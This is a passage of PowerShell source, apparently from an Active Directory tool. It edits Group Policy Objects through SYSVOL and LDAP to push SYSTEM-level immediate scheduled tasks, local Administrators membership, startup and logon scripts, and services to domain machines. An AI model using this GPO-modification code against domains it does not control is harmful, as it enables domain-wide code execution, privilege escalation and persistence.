          <Principal id="Author">
            <UserId>NT AUTHORITY\SYSTEM</UserId>
            <LogonType>S4U</LogonType>
            <RunLevel>HighestAvailable</RunLevel>
          </Principal>
"@
                                }
                                'Users' {
                                    $propertiesRunAs = "S-1-5-32-545"
                                    $propertiesLogonType = "InteractiveToken"
                                    $principalXml = @"
          <Principal id="Author">
            <GroupId>S-1-5-32-545</GroupId>
            <RunLevel>LeastPrivilege</RunLevel>
          </Principal>
"@
                                }
                                'Interactive' {
                                    $propertiesRunAs = ""
                                    $propertiesLogonType = "InteractiveToken"
                                    $principalXml = @"
          <Principal id="Author">
            <LogonType>InteractiveToken</LogonType>
            <RunLevel>LeastPrivilege</RunLevel>
          </Principal>
"@
                                }
                            }

                            # Determine task author: use current session user or fall back to domain\Administrator
                            $taskAuthorVal = if ($taskAuthorOverride) {
                                $taskAuthorOverride
                            } elseif ($Script:LDAPContext -and $Script:LDAPContext.UserName) {
                                "$domainName\$($Script:LDAPContext.UserName)"
                            } else {
                                "$domainName\Administrator"
                            }

                            # Build single task entry XML
                            $taskEntryXml = @"
  <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="$([System.Security.SecurityElement]::Escape($taskNameVal))" image="0" changed="$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" uid="$taskUID">
    <Properties action="C" name="$([System.Security.SecurityElement]::Escape($taskNameVal))" runAs="$propertiesRunAs" logonType="$propertiesLogonType">
      <Task version="1.2">
        <RegistrationInfo>
          <Author>$([System.Security.SecurityElement]::Escape($taskAuthorVal))</Author>
          <Description>GPO-deployed immediate task</Description>
        </RegistrationInfo>
        <Principals>
$principalXml
        </Principals>
        <Settings>
          <IdleSettings>
            <Duration>PT10M</Duration>
            <WaitTimeout>PT1H</WaitTimeout>
            <StopOnIdleEnd>true</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
          </IdleSettings>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
          <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
          <AllowHardTerminate>true</AllowHardTerminate>
          <StartWhenAvailable>true</StartWhenAvailable>
          <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
          <AllowStartOnDemand>true</AllowStartOnDemand>
          <Enabled>true</Enabled>
          <Hidden>false</Hidden>
          <RunOnlyIfIdle>false</RunOnlyIfIdle>
          <WakeToRun>false</WakeToRun>
          <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
          <Priority>7</Priority>
          <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
        </Settings>
        <Triggers>
          <TimeTrigger>
            <StartBoundary>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</StartBoundary>
            <Enabled>true</Enabled>
          </TimeTrigger>
        </Triggers>
        <Actions>
          <Exec>
            <Command>$([System.Security.SecurityElement]::Escape($taskCommandVal))</Command>
            <Arguments>$([System.Security.SecurityElement]::Escape($taskArgumentsVal))</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
"@

                            # Create or update ScheduledTasks.xml (append to existing)
                            if (Test-Path $scheduledTasksXmlPath) {
                                # Append to existing file using XmlDocument for robust parsing
                                [xml]$xmlDoc = Get-Content -Path $scheduledTasksXmlPath -Raw
                                $fragment = $xmlDoc.CreateDocumentFragment()
                                $fragment.InnerXml = $taskEntryXml
                                $xmlDoc.ScheduledTasks.AppendChild($fragment) | Out-Null
                                $xmlDoc.Save($scheduledTasksXmlPath)
                            } else {
                                # Create new file
                                $newContent = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
$taskEntryXml
</ScheduledTasks>
"@
                                Set-Content -Path $scheduledTasksXmlPath -Value $newContent -Encoding UTF8 -Force -ErrorAction Stop
                            }

                            Write-Log "[Set-DomainGPO] Created/updated ScheduledTasks.xml at: $scheduledTasksXmlPath"

                            return @{
                                Success = $true
                                XMLPath = $scheduledTasksXmlPath
                                TaskUID = $taskUID
                            }
                        }.GetNewClosure()

                        if (-not $smbResult -or -not $smbResult.Success) {
                            throw "Failed to create ScheduledTasks.xml via SMB"
                        }

                        # Update GPO machine extensions in AD (Scheduled Tasks CSE)
                        # {AADCED64-746C-4633-A97C-D61349046527} = GP Preference CSE
                        # {CAB54552-DEEA-4691-817E-ED4A4D1AFC72} = Scheduled Tasks
                        $machineExtensions = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
                        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('gPCMachineExtensionNames') -SizeLimit 1)[0]
                        $currentExtensions = if ($gpoResult -and $gpoResult.gPCMachineExtensionNames) { $gpoResult.gPCMachineExtensionNames } else { $null }
                        if (-not $currentExtensions -or $currentExtensions -notmatch 'CAB54552-DEEA-4691-817E-ED4A4D1AFC72') {
                            $newExtensions = if ($currentExtensions) { $currentExtensions + $machineExtensions } else { $machineExtensions }
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $GPODN
                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "gPCMachineExtensionNames"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newExtensions) | Out-Null
                            $ModifyRequest.Modifications.Add($Modification) | Out-Null
                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }
                            Write-Log "[Set-DomainGPO] Updated gPCMachineExtensionNames with ScheduledTasks extension"
                        }

                        # Increment GPO version
                        $versionResult = Update-GPOVersion -GPODN $GPODN -GPOName $GPOName -Credential $Credential -IncrementMachine
                        if (-not $versionResult.Success) {
                            Write-Warning "[Set-DomainGPO] GPO version increment failed: $($versionResult.Message)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "AddScheduledTask"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                TaskName = $TaskName
                                TaskCommand = $TaskCommand
                                TaskArguments = $TaskArguments
                                TaskRunAs = $TaskRunAs
                                TaskUID = $smbResult.TaskUID
                                XMLPath = $smbResult.XMLPath
                                NewVersion = $versionResult.NewVersion
                                Success = $true
                                Message = "Scheduled Task added successfully"
                            }
                        } else {
                            Show-Line "Successfully added Immediate Scheduled Task to GPO '$GPOName'" -Class Hint
                            Show-KeyValue "Task Name:" $TaskName
                            Show-KeyValue "Command:" $TaskCommand
                            Show-KeyValue "Arguments:" $TaskArguments
                            Show-KeyValue "Run As:" $TaskRunAs
                            Show-KeyValue "GPO Version:" $versionResult.NewVersion
                        }

                    } catch {
                        throw "Failed to add Scheduled Task: $_"
                    }
                }

                'AddLocalGroupMember' {
                    Write-Log "[Set-DomainGPO] Adding Local Group Member to GPO: $GPOName"

                    try {
                        # Extract GPO GUID
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Resolve LocalGroup to SID if it's a well-known name
                        $localGroupSID = switch ($LocalGroup.ToLower()) {
                            'administrators' { 'S-1-5-32-544' }
                            'remote desktop users' { 'S-1-5-32-555' }
                            'backup operators' { 'S-1-5-32-551' }
                            'power users' { 'S-1-5-32-547' }
                            'users' { 'S-1-5-32-545' }
                            'guests' { 'S-1-5-32-546' }
                            default {
                                if ($LocalGroup -match '^S-1-') { $LocalGroup } else { $null }
                            }
                        }

                        if (-not $localGroupSID) {
                            # Use the name directly if not a well-known group
                            $localGroupSID = $LocalGroup
                            Write-Log "[Set-DomainGPO] Using group name directly: $LocalGroup"
                        }

                        # Resolve member SID
                        $memberSID = $null
                        if ($MemberToAdd -match '^S-1-') {
                            $memberSID = $MemberToAdd
                        } else {
                            # Try to resolve via AD
                            $memberObj = @(Get-DomainObject -Identity $MemberToAdd @ConnectionParams)[0]
                            if ($memberObj -and $memberObj.objectSid) {
                                $memberSID = (New-Object System.Security.Principal.SecurityIdentifier($memberObj.objectSid, 0)).Value
                            }
                        }

                        if (-not $memberSID) {
                            throw "Could not resolve member '$MemberToAdd' to SID. Provide DOMAIN\user format or SID."
                        }

                        # Prepare variables for closure
                        $domainName = $Script:LDAPContext.Domain
                        $gpoGuid = $GPOGUID
                        $localGroupVal = $localGroupSID
                        $localGroupName = $LocalGroup
                        $memberSIDVal = $memberSID
                        $memberNameVal = $MemberToAdd

                        # Use Invoke-SMBAccess to create/update Groups.xml
                        $smbResult = Invoke-SMBAccess -Description "Create GPO Local Group Member" -ErrorHandling Stop -ScriptBlock {
                            param($basePath)

                            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"
                            $machinePrefsPath = Join-Path $gpoBasePath "Machine\Preferences\Groups"

                            if (-not (Test-Path $gpoBasePath)) {
                                throw "SYSVOL folder not found: $gpoBasePath"
                            }

                            # Create folder structure
                            if (-not (Test-Path $machinePrefsPath)) {
                                $null = New-Item -Path $machinePrefsPath -ItemType Directory -Force -ErrorAction Stop
                            }

                            $groupsXmlPath = Join-Path $machinePrefsPath "Groups.xml"

                            # Generate unique group UID
                            $groupUID = "{$([System.Guid]::NewGuid().ToString().ToUpper())}"

                            # Build single group entry XML
                            $groupEntryXml = @"
  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="$([System.Security.SecurityElement]::Escape($localGroupName)) (built-in)" image="2" changed="$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" uid="$groupUID">
    <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="$localGroupVal" groupName="$([System.Security.SecurityElement]::Escape($localGroupName)) (built-in)">
      <Members>
        <Member name="$([System.Security.SecurityElement]::Escape($memberNameVal))" action="ADD" sid="$memberSIDVal"/>
      </Members>
    </Properties>
  </Group>
"@

                            # Create or update Groups.xml (append to existing)
                            if (Test-Path $groupsXmlPath) {
                                # Append to existing file using XmlDocument for robust parsing
                                [xml]$xmlDoc = Get-Content -Path $groupsXmlPath -Raw
                                $fragment = $xmlDoc.CreateDocumentFragment()
                                $fragment.InnerXml = $groupEntryXml
                                $xmlDoc.Groups.AppendChild($fragment) | Out-Null
                                $xmlDoc.Save($groupsXmlPath)
                            } else {
                                # Create new file
                                $newContent = @"
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
$groupEntryXml
</Groups>
"@
                                Set-Content -Path $groupsXmlPath -Value $newContent -Encoding UTF8 -Force -ErrorAction Stop
                            }

                            Write-Log "[Set-DomainGPO] Created/updated Groups.xml at: $groupsXmlPath"

                            return @{
                                Success = $true
                                XMLPath = $groupsXmlPath
                                GroupUID = $groupUID
                            }
                        }.GetNewClosure()

                        if (-not $smbResult -or -not $smbResult.Success) {
                            throw "Failed to create Groups.xml via SMB"
                        }

                        # Update GPO machine extensions in AD (Local Users and Groups CSE)
                        # {17D89FEC-5C44-4972-B12D-241CAEF74509} = Local Users and Groups
                        $machineExtensions = "[{00000000-0000-0000-0000-000000000000}{17D89FEC-5C44-4972-B12D-241CAEF74509}][{AADCED64-746C-4633-A97C-D61349046527}{17D89FEC-5C44-4972-B12D-241CAEF74509}]"
                        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('gPCMachineExtensionNames') -SizeLimit 1)[0]
                        $currentExtensions = if ($gpoResult -and $gpoResult.gPCMachineExtensionNames) { $gpoResult.gPCMachineExtensionNames } else { $null }
                        if (-not $currentExtensions -or $currentExtensions -notmatch '17D89FEC-5C44-4972-B12D-241CAEF74509') {
                            $newExtensions = if ($currentExtensions) { $currentExtensions + $machineExtensions } else { $machineExtensions }
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $GPODN
                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "gPCMachineExtensionNames"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newExtensions) | Out-Null
                            $ModifyRequest.Modifications.Add($Modification) | Out-Null
                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }
                            Write-Log "[Set-DomainGPO] Updated gPCMachineExtensionNames with LocalGroups extension"
                        }

                        # Increment GPO version
                        $versionResult = Update-GPOVersion -GPODN $GPODN -GPOName $GPOName -Credential $Credential -IncrementMachine
                        if (-not $versionResult.Success) {
                            Write-Warning "[Set-DomainGPO] GPO version increment failed: $($versionResult.Message)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "AddLocalGroupMember"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                LocalGroup = $LocalGroup
                                LocalGroupSID = $localGroupSID
                                MemberToAdd = $MemberToAdd
                                MemberSID = $memberSID
                                XMLPath = $smbResult.XMLPath
                                NewVersion = $versionResult.NewVersion
                                Success = $true
                                Message = "Local Group Member added successfully"
                            }
                        } else {
                            Show-Line "Successfully added member to local group via GPO '$GPOName'" -Class Hint
                            Show-KeyValue "Local Group:" "$LocalGroup ($localGroupSID)"
                            Show-KeyValue "Member Added:" "$MemberToAdd ($memberSID)"
                            Show-KeyValue "GPO Version:" $versionResult.NewVersion
                        }

                    } catch {
                        throw "Failed to add Local Group Member: $_"
                    }
                }

                'AddStartupScript' {
                    Write-Log "[Set-DomainGPO] Adding Startup Script to GPO: $GPOName"

                    try {
                        # Validate parameters
                        if (-not $ScriptPath -and -not $ScriptContent) {
                            throw "Either -ScriptPath or -ScriptContent must be specified"
                        }

                        if ($ScriptContent -and -not $ScriptName) {
                            throw "-ScriptName must be specified when using -ScriptContent"
                        }

                        # Determine script content and name
                        $scriptContentToWrite = $null
                        $scriptFileName = $null

                        if ($ScriptPath) {
                            if (-not (Test-Path $ScriptPath)) {
                                throw "Script file not found: $ScriptPath"
                            }
                            $scriptContentToWrite = Get-Content -Path $ScriptPath -Raw
                            $scriptFileName = if ($ScriptName) { $ScriptName } else { Split-Path $ScriptPath -Leaf }
                        } else {
                            $scriptContentToWrite = $ScriptContent
                            $scriptFileName = $ScriptName
                        }

                        # Extract GPO GUID
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Prepare variables for closure
                        $domainName = $Script:LDAPContext.Domain
                        $gpoGuid = $GPOGUID
                        $scriptFileNameVal = $scriptFileName
                        $scriptContentVal = $scriptContentToWrite
                        $scriptParamsVal = $ScriptParameters

                        # Use Invoke-SMBAccess to create script and scripts.ini
                        $smbResult = Invoke-SMBAccess -Description "Create GPO Startup Script" -ErrorHandling Stop -ScriptBlock {
                            param($basePath)

                            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"
                            $machineScriptsPath = Join-Path $gpoBasePath "Machine\Scripts\Startup"

                            if (-not (Test-Path $gpoBasePath)) {
                                throw "SYSVOL folder not found: $gpoBasePath"
                            }

                            # Create folder structure
                            if (-not (Test-Path $machineScriptsPath)) {
                                $null = New-Item -Path $machineScriptsPath -ItemType Directory -Force -ErrorAction Stop
                            }

                            # Write script file
                            $scriptFilePath = Join-Path $machineScriptsPath $scriptFileNameVal
                            Set-Content -Path $scriptFilePath -Value $scriptContentVal -Force -ErrorAction Stop

                            # Create/update scripts.ini in Machine\Scripts folder
                            $scriptsIniPath = Join-Path $gpoBasePath "Machine\Scripts\scripts.ini"

                            # Read existing or create new
                            $scriptsIniContent = ""
                            $nextIndex = 0

                            if (Test-Path $scriptsIniPath) {
                                $scriptsIniContent = Get-Content -Path $scriptsIniPath -Raw
                                # Find highest index ONLY within [Startup] section
                                if ($scriptsIniContent -match '\[Startup\]([^\[]+)') {
                                    $startupContent = $Matches[1]
                                    $indexMatches = [regex]::Matches($startupContent, '(\d+)CmdLine')
                                    foreach ($m in $indexMatches) {
                                        $idx = [int]$m.Groups[1].Value
                                        if ($idx -ge $nextIndex) { $nextIndex = $idx + 1 }
                                    }
                                }
                            }

                            # Append startup script entry
                            $startupSection = @"

[Startup]
${nextIndex}CmdLine=$scriptFileNameVal
${nextIndex}Parameters=$scriptParamsVal
"@

                            if ($scriptsIniContent -match '\[Startup\]') {
                                # Append to existing [Startup] section using string manipulation
                                # (avoids regex replacement issues with $ in filenames/parameters)
                                $newEntry = "${nextIndex}CmdLine=$scriptFileNameVal`r`n${nextIndex}Parameters=$scriptParamsVal`r`n"
                                $startupIdx = $scriptsIniContent.IndexOf('[Startup]')
                                # Find end of [Startup] section (next [ or end of string)
                                $afterStartup = $startupIdx + '[Startup]'.Length
                                $nextSectionIdx = $scriptsIniContent.IndexOf('[', $afterStartup)
                                if ($nextSectionIdx -eq -1) {
                                    # [Startup] is last section — append at end
                                    $scriptsIniContent = $scriptsIniContent.TrimEnd() + "`r`n" + $newEntry
                                } else {
                                    # Insert before next section
                                    $scriptsIniContent = $scriptsIniContent.Substring(0, $nextSectionIdx).TrimEnd() + "`r`n" + $newEntry + "`r`n" + $scriptsIniContent.Substring($nextSectionIdx)
                                }
                            } else {
                                $scriptsIniContent += $startupSection
                            }

                            Set-Content -Path $scriptsIniPath -Value $scriptsIniContent -Force -ErrorAction Stop

                            Write-Log "[Set-DomainGPO] Created startup script at: $scriptFilePath"

                            return @{
                                Success = $true
                                ScriptPath = $scriptFilePath
                                ScriptsIniPath = $scriptsIniPath
                                ScriptIndex = $nextIndex
                            }
                        }.GetNewClosure()

                        if (-not $smbResult -or -not $smbResult.Success) {
                            throw "Failed to create Startup Script via SMB"
                        }

                        # Update GPO machine extensions in AD (Scripts CSE)
                        # {42B5FAAE-6536-11D2-AE5A-0000F87571E3} = Scripts CSE
                        $machineExtensions = "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"
                        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('gPCMachineExtensionNames') -SizeLimit 1)[0]
                        $currentExtensions = if ($gpoResult -and $gpoResult.gPCMachineExtensionNames) { $gpoResult.gPCMachineExtensionNames } else { $null }
                        if (-not $currentExtensions -or $currentExtensions -notmatch '42B5FAAE-6536-11D2-AE5A-0000F87571E3') {
                            $newExtensions = if ($currentExtensions) { $currentExtensions + $machineExtensions } else { $machineExtensions }
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $GPODN
                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "gPCMachineExtensionNames"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newExtensions) | Out-Null
                            $ModifyRequest.Modifications.Add($Modification) | Out-Null
                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }
                            Write-Log "[Set-DomainGPO] Updated gPCMachineExtensionNames with Scripts extension"
                        }

                        # Increment GPO version
                        $versionResult = Update-GPOVersion -GPODN $GPODN -GPOName $GPOName -Credential $Credential -IncrementMachine
                        if (-not $versionResult.Success) {
                            Write-Warning "[Set-DomainGPO] GPO version increment failed: $($versionResult.Message)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "AddStartupScript"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                ScriptName = $scriptFileName
                                ScriptPath = $smbResult.ScriptPath
                                ScriptParameters = $ScriptParameters
                                NewVersion = $versionResult.NewVersion
                                Success = $true
                                Message = "Startup Script added successfully"
                            }
                        } else {
                            Show-Line "Successfully added Startup Script to GPO '$GPOName'" -Class Hint
                            Show-KeyValue "Script Name:" $scriptFileName
                            Show-KeyValue "Script Path:" $smbResult.ScriptPath
                            Show-KeyValue "Parameters:" $ScriptParameters
                            Show-KeyValue "GPO Version:" $versionResult.NewVersion
                        }

                    } catch {
                        throw "Failed to add Startup Script: $_"
                    }
                }

                'AddLogonScript' {
                    Write-Log "[Set-DomainGPO] Adding Logon Script to GPO: $GPOName"

                    try {
                        # Validate parameters
                        if (-not $ScriptPath -and -not $ScriptContent) {
                            throw "Either -ScriptPath or -ScriptContent must be specified"
                        }

                        if ($ScriptContent -and -not $ScriptName) {
                            throw "-ScriptName must be specified when using -ScriptContent"
                        }

                        # Determine script content and name
                        $scriptContentToWrite = $null
                        $scriptFileName = $null

                        if ($ScriptPath) {
                            if (-not (Test-Path $ScriptPath)) {
                                throw "Script file not found: $ScriptPath"
                            }
                            $scriptContentToWrite = Get-Content -Path $ScriptPath -Raw
                            $scriptFileName = if ($ScriptName) { $ScriptName } else { Split-Path $ScriptPath -Leaf }
                        } else {
                            $scriptContentToWrite = $ScriptContent
                            $scriptFileName = $ScriptName
                        }

                        # Extract GPO GUID
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Prepare variables for closure
                        $domainName = $Script:LDAPContext.Domain
                        $gpoGuid = $GPOGUID
                        $scriptFileNameVal = $scriptFileName
                        $scriptContentVal = $scriptContentToWrite
                        $scriptParamsVal = $ScriptParameters

                        # Use Invoke-SMBAccess to create script and scripts.ini
                        $smbResult = Invoke-SMBAccess -Description "Create GPO Logon Script" -ErrorHandling Stop -ScriptBlock {
                            param($basePath)

                            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"
                            $userScriptsPath = Join-Path $gpoBasePath "User\Scripts\Logon"

                            if (-not (Test-Path $gpoBasePath)) {
                                throw "SYSVOL folder not found: $gpoBasePath"
                            }

                            # Create folder structure
                            if (-not (Test-Path $userScriptsPath)) {
                                $null = New-Item -Path $userScriptsPath -ItemType Directory -Force -ErrorAction Stop
                            }

                            # Write script file
                            $scriptFilePath = Join-Path $userScriptsPath $scriptFileNameVal
                            Set-Content -Path $scriptFilePath -Value $scriptContentVal -Force -ErrorAction Stop

                            # Create/update scripts.ini in User\Scripts folder
                            $scriptsIniPath = Join-Path $gpoBasePath "User\Scripts\scripts.ini"

                            # Read existing or create new
                            $scriptsIniContent = ""
                            $nextIndex = 0

                            if (Test-Path $scriptsIniPath) {
                                $scriptsIniContent = Get-Content -Path $scriptsIniPath -Raw
                                # Find highest index ONLY within [Logon] section
                                if ($scriptsIniContent -match '\[Logon\]([^\[]+)') {
                                    $logonContent = $Matches[1]
                                    $indexMatches = [regex]::Matches($logonContent, '(\d+)CmdLine')
                                    foreach ($m in $indexMatches) {
                                        $idx = [int]$m.Groups[1].Value
                                        if ($idx -ge $nextIndex) { $nextIndex = $idx + 1 }
                                    }
                                }
                            }

                            # Append logon script entry
                            $logonSection = @"

[Logon]
${nextIndex}CmdLine=$scriptFileNameVal
${nextIndex}Parameters=$scriptParamsVal
"@

                            if ($scriptsIniContent -match '\[Logon\]') {
                                # Append to existing [Logon] section using string manipulation
                                # (avoids regex replacement issues with $ in filenames/parameters)
                                $newEntry = "${nextIndex}CmdLine=$scriptFileNameVal`r`n${nextIndex}Parameters=$scriptParamsVal`r`n"
                                $logonIdx = $scriptsIniContent.IndexOf('[Logon]')
                                # Find end of [Logon] section (next [ or end of string)
                                $afterLogon = $logonIdx + '[Logon]'.Length
                                $nextSectionIdx = $scriptsIniContent.IndexOf('[', $afterLogon)
                                if ($nextSectionIdx -eq -1) {
                                    # [Logon] is last section — append at end
                                    $scriptsIniContent = $scriptsIniContent.TrimEnd() + "`r`n" + $newEntry
                                } else {
                                    # Insert before next section
                                    $scriptsIniContent = $scriptsIniContent.Substring(0, $nextSectionIdx).TrimEnd() + "`r`n" + $newEntry + "`r`n" + $scriptsIniContent.Substring($nextSectionIdx)
                                }
                            } else {
                                $scriptsIniContent += $logonSection
                            }

                            Set-Content -Path $scriptsIniPath -Value $scriptsIniContent -Force -ErrorAction Stop

                            Write-Log "[Set-DomainGPO] Created logon script at: $scriptFilePath"

                            return @{
                                Success = $true
                                ScriptPath = $scriptFilePath
                                ScriptsIniPath = $scriptsIniPath
                                ScriptIndex = $nextIndex
                            }
                        }.GetNewClosure()

                        if (-not $smbResult -or -not $smbResult.Success) {
                            throw "Failed to create Logon Script via SMB"
                        }

                        # Update GPO user extensions in AD (Scripts CSE)
                        # {42B5FAAE-6536-11D2-AE5A-0000F87571E3} = Scripts CSE
                        $userExtensions = "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"
                        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('gPCUserExtensionNames') -SizeLimit 1)[0]
                        $currentExtensions = if ($gpoResult -and $gpoResult.gPCUserExtensionNames) { $gpoResult.gPCUserExtensionNames } else { $null }
                        if (-not $currentExtensions -or $currentExtensions -notmatch '42B5FAAE-6536-11D2-AE5A-0000F87571E3') {
                            $newExtensions = if ($currentExtensions) { $currentExtensions + $userExtensions } else { $userExtensions }
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $GPODN
                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "gPCUserExtensionNames"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newExtensions) | Out-Null
                            $ModifyRequest.Modifications.Add($Modification) | Out-Null
                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }
                            Write-Log "[Set-DomainGPO] Updated gPCUserExtensionNames with Scripts extension"
                        }

                        # Increment GPO version (User-side)
                        $versionResult = Update-GPOVersion -GPODN $GPODN -GPOName $GPOName -Credential $Credential -IncrementUser
                        if (-not $versionResult.Success) {
                            Write-Warning "[Set-DomainGPO] GPO version increment failed: $($versionResult.Message)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "AddLogonScript"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                ScriptName = $scriptFileName
                                ScriptPath = $smbResult.ScriptPath
                                ScriptParameters = $ScriptParameters
                                NewVersion = $versionResult.NewVersion
                                Success = $true
                                Message = "Logon Script added successfully"
                            }
                        } else {
                            Show-Line "Successfully added Logon Script to GPO '$GPOName'" -Class Hint
                            Show-KeyValue "Script Name:" $scriptFileName
                            Show-KeyValue "Script Path:" $smbResult.ScriptPath
                            Show-KeyValue "Parameters:" $ScriptParameters
                            Show-KeyValue "GPO Version:" $versionResult.NewVersion
                        }

                    } catch {
                        throw "Failed to add Logon Script: $_"
                    }
                }

                'AddService' {
                    Write-Log "[Set-DomainGPO] Adding Service to GPO: $GPOName"

                    try {
                        # Extract GPO GUID
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Determine display name
                        $svcDisplayName = if ($ServiceDisplayName) { $ServiceDisplayName } else { $ServiceName }

                        # Map StartType to GPP values
                        $startupTypeValue = switch ($StartType) {
                            'Automatic'            { "AUTOMATIC" }
                            'AutomaticDelayedStart' { "AUTOMATIC" }  # GPP uses AUTOMATIC for delayed start too
                            'Manual'               { "MANUAL" }
                            'Disabled'             { "DISABLED" }
                            default                { "AUTOMATIC" }
                        }

                        # Map ServiceAccount to GPP account values
                        $accountName = switch ($ServiceAccount) {
                            'LocalSystem'    { "NT AUTHORITY\SYSTEM" }
                            'LocalService'   { "NT AUTHORITY\LocalService" }
                            'NetworkService' { "NT AUTHORITY\NetworkService" }
                            default          { $ServiceAccount }  # Domain account as-is
                        }

                        # Generate unique UID for the service item
                        $itemUID = "{" + [guid]::NewGuid().ToString().ToUpper() + "}"

                        # Current timestamp
                        $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

                        # Prepare variables for closure (XML-escaped to prevent injection)
                        $domainName = $Script:LDAPContext.Domain
                        $gpoGuid = $GPOGUID
                        $svcNameVal = [System.Security.SecurityElement]::Escape($ServiceName)
                        $svcDisplayVal = [System.Security.SecurityElement]::Escape($svcDisplayName)
                        $binaryPathVal = [System.Security.SecurityElement]::Escape($BinaryPath)
                        $startupTypeVal = $startupTypeValue
                        $accountVal = [System.Security.SecurityElement]::Escape($accountName)
                        $itemUIDVal = $itemUID
                        $timestampVal = $timestamp

                        # CLSID for Services GPP extension (7150F9BF = Services CSE)
